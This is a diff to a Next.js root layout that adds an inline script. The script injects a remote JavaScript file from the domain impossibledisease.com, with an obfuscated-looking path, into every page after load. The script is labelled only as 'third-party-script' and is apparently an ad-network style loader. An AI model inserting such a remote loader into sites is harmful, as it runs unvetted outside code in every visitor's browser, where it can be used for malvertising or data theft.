@@ -1,4 +1,5 @@
 import type { Metadata } from 'next';
+import Script from 'next/script';
 import './globals.css';
 import { Header } from '@/components/Header';
 import { Footer } from '@/components/Footer';
@@ -30,6 +31,18 @@ export default function RootLayout({
           <Footer />
           <Toaster />
         </FirebaseClientProvider>
+        <Script id="third-party-script" strategy="afterInteractive">
+          {`(function(ight){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = ight || {};
+s.src = "//impossibledisease.com/bXXEVqscd.G/l/0iYvWncS/UemmY9DuEZpUxl/kJPYT/YZ3zNXjmIH2KM-jCAstrNQjVcI2/Mbj-YwyoM/QT";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})`}
+        </Script>
       </body>
     </html>
   );
